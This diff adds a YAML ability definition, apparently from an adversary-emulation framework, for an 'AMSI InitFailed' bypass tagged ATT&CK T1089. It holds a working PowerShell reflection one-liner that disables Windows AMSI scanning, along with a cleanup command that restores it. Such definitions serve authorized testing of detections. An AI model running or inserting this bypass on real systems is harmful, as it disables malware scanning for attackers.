@@ -1,0 +1,16 @@
+---
+
+- id: tacdefen-1089-AR10-1v00-200120184608
+  name: AMSI Bypass - AMSI InitFailed
+  description: .      Any easy way to bypass AMSI inspection is it patch the dll in memory setting the "amsiInitFailed" function to true. .      https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
+  tactic: defense-evasion
+  technique:
+    attack_id: T1089
+    name: Disabling Security Tools
+  platforms:
+    windows:
+      psh:
+        command: |
+          [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+        cleanup: |
+          [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)
